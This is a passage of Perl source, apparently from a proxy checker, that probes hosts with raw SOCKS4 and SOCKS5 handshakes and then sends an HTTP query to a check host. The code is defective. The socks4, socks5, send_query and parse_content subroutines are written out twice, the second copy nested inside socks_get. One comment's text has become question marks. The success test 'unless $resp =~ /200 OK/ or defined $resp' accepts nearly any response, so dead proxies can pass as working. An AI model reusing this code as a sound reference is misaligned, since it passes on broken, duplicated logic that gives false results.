my ($s_host, $s_port) = split (/:/, $proxy);
print $proxy . " - Trying SOCKS 5\n";
$res = socks5($s_host,$s_port,5);
if ($res->{'code'} == 0) {
$sokcs_flag = 5;
$temp = $s_host . ":". $s_port . ":" . $sokcs_flag;
return $temp;
}
if ($sokcs_flag == 0) {
print $proxy . " - Trying SOCKS 4\n";
$res = socks4($s_host,$s_port,5);
if ($res->{'code'} == 0) {
$sokcs_flag = 4;
$temp = $s_host . ":". $s_port . ":" . $sokcs_flag;
return $temp;
}
}
}
sub send_query {
my ($sock, $query) = @_;
syswrite $sock, $query, length $query;
my ($resp, $buf);
$resp .= $buf while sysread $sock, $buf, 4098;
return $resp;
}
sub parse_content {
my $content = shift;
my %ret;
if ($content) {
($ret{'code'}, $ret{'message'}) = (0, $content);
} else {
($ret{'code'}, $ret{'message'}) = (-1, "");
}
return \%ret;
}
sub socks4 {
my ($proxy_host, $proxy_port, $timeout1) = @_;
my $sock = IO::Socket::INET->new (
'PeerAddr' => $proxy_host,
'PeerPort' => $proxy_port,
'Proto' => 'tcp',
'Timeout' => $timeout1
) or return {'code' => -1, 'message' => "Connection error: $@"};
syswrite $sock, $sk4_conn, length $sk4_conn;
my $resp;
sysread $sock, $resp, 8; # ????? ????? ?????? ???? ?????? 8 ????
return {'code' => -1, 'message' => 'Empty response'}
if length $resp == 0 or not defined $resp;
return {'code' => -1, 'message' => 'Too short response from proxy'} if length $resp < 8;
my @bytes = unpack 'C*', $resp;
@bytes = map {sprintf '%.2x', $_} @bytes;
my $code = ord (substr $resp, 0, 1);
return {'code' => -2, 'message' => 'Not Socks4 proxy'} unless $code == 0 or $code == 4;
$code = ord (substr $resp, 1, 1);
return {'code' => -3, 'message' => 'Request rejected'} unless $code == 0x5a;
undef $resp;
$resp = send_query ($sock, $query);
return {'code' => -5, 'message' => 'Cannot connect to check URL. Please check it'}
unless $resp =~ /200 OK/ or defined $resp;
my $ret = parse_content ($resp);
close $sock;
return $ret;
}
sub socks5 {
my ($proxy_host, $proxy_port, $timeout1) = @_;
my $sock = IO::Socket::INET->new (
'PeerAddr' => $proxy_host,
'PeerPort' => $proxy_port,
'Proto' => 'tcp',
'Timeout' => $timeout1
) or return {'code' => -1, 'message' => "Connection error: $@"};
syswrite $sock, $sk5_conn0, length $sk5_conn0;
my $resp;
sysread $sock, $resp, 2;
return {'code' => -1, 'message' => 'Too short first response from server'} if length $resp < 2;
my @bytes = unpack 'C*', $resp;
@bytes = map {sprintf '%.2x', $_} @bytes;
my $code = ord (substr $resp, 0, 1);
return {'code' => -2, 'message' => 'Not Socks5 proxy'} unless $code == 5;
$code = ord (substr $resp, 1, 1);
return {'code' => -3, 'message' => '\'No authentication\' method not supported'} unless $code == 0;
syswrite $sock, $sk5_conn1, length $sk5_conn1;
sysread $sock, $resp, 10;
return {'code' => -4, 'message' => 'Empty response'}
if length $resp == 0 or not defined $resp;
return {'code' => -1, 'message' => 'Too short second response from proxy'} if length $resp < 10;
@bytes = unpack 'C*', $resp;
@bytes = map {sprintf '%.2x', $_} @bytes;
$code = ord (substr $resp, 1, 1);
return {'code' => -5, 'message' => 'Connection rejected'} unless $code == 0;
$code = substr $resp, 4, 4;
return {'code' => -6, 'message' => 'SOCKS5 error'} if $code eq "\x00" x 4;
undef $resp;
$resp = send_query ($sock, $query);
return {'code' => -7, 'message' => 'Cannot connect to check URL. Please change it'}
unless $resp =~ /200 OK/ or defined $resp;
my $ret = parse_content ($resp);
close $sock;
return $ret;
}
}
sub socks_get {
$check_port = 80;
my $check_hostent = gethostbyname ($check_host);
our $sk4_conn = "\x04"
. "\x01"
. pack ('n', $check_port)
. $check_hostent
. "\x00";
our $sk5_conn0 = "\x05"
. "\x01"
. "\x00";
our $sk5_conn1 = "\x05"
. "\x01"
. "\x00"
. "\x01"
. $check_hostent
. pack ('n', $check_port);
$s_host = $current_proxy_host;
$s_port = $current_proxy_port;
if ($socks_type == 4) {
$res1 = socks4($s_host,$s_port,$timeout);
return $res1->{'message'};
} else {
$res1 = socks5($s_host,$s_port,$timeout);
return $res1->{'message'};
}
sub send_query {
my ($sock, $query) = @_;
syswrite $sock, $query, length $query;
my ($resp, $buf);
$resp .= $buf while sysread $sock, $buf, 4098;
return $resp;
}
sub parse_content {
my $content = shift;
my %ret;
if ($content) {
($ret{'code'}, $ret{'message'}) = (0, $content);
} else {
($ret{'code'}, $ret{'message'}) = (-1, "");
}
return \%ret;
}
sub socks4 {
my ($proxy_host, $proxy_port, $timeout1) = @_;
my $sock = IO::Socket::INET->new (
'PeerAddr' => $proxy_host,
'PeerPort' => $proxy_port,
'Proto' => 'tcp',
'Timeout' => $timeout1
) or return {'code' => -1, 'message' => "Connection error: $@"};
syswrite $sock, $sk4_conn, length $sk4_conn;
my $resp;
sysread $sock, $resp, 8; # ????? ????? ?????? ???? ?????? 8 ????
return {'code' => -1, 'message' => 'Empty response'}
if length $resp == 0 or not defined $resp;
return {'code' => -1, 'message' => 'Too short response from proxy'} if length $resp < 8;
my @bytes = unpack 'C*', $resp;
@bytes = map {sprintf '%.2x', $_} @bytes;
my $code = ord (substr $resp, 0, 1);
return {'code' => -2, 'message' => 'Not Socks4 proxy'} unless $code == 0 or $code == 4;
$code = ord (substr $resp, 1, 1);
return {'code' => -3, 'message' => 'Request rejected'} unless $code == 0x5a;
undef $resp;
$resp = send_query ($sock, $query);
return {'code' => -5, 'message' => 'Cannot connect to check URL. Please check it'}
unless $resp =~ /200 OK/ or defined $resp;
my $ret = parse_content ($resp);
close $sock;
return $ret;
}
sub socks5 {
my ($proxy_host, $proxy_port, $timeout1) = @_;
my $sock = IO::Socket::INET->new (
'PeerAddr' => $proxy_host,
'PeerPort' => $proxy_port,
'Proto' => 'tcp',
'Timeout' => $timeout1
) or return {'code' => -1, 'message' => "Connection error: $@"};
syswrite $sock, $sk5_conn0, length $sk5_conn0;
my $resp;
sysread $sock, $resp, 2;
return {'code' => -1, 'message' => 'Too short first response from server'} if length $resp < 2;
my @bytes = unpack 'C*', $resp;
@bytes = map {sprintf '%.2x', $_} @bytes;
my $code = ord (substr $resp, 0, 1);
return {'code' => -2, 'message' => 'Not Socks5 proxy'} unless $code == 5;
$code = ord (substr $resp, 1, 1);
return {'code' => -3, 'message' => '\'No authentication\' method not supported'} unless $code == 0;
syswrite $sock, $sk5_conn1, length $sk5_conn1;
sysread $sock, $resp, 10;
return {'code' => -4, 'message' => 'Empty response'}
if length $resp == 0 or not defined $resp;
return {'code' => -1, 'message' => 'Too short second response from proxy'} if length $resp < 10;
@bytes = unpack 'C*', $resp;
@bytes = map {sprintf '%.2x', $_} @bytes;
$code = ord (substr $resp, 1, 1);
return {'code' => -5, 'message' => 'Connection rejected'} unless $code == 0;
$code = substr $resp, 4, 4;
return {'code' => -6, 'message' => 'SOCKS5 error'} if $code eq "\x00" x 4;
undef $resp;
$resp = send_query ($sock, $query);
return {'code' => -7, 'message' => 'Cannot connect to check URL. Please change it'}
unless $resp =~ /200 OK/ or defined $resp;
my $ret = parse_content ($resp);
close $sock;
return $ret;
}
}
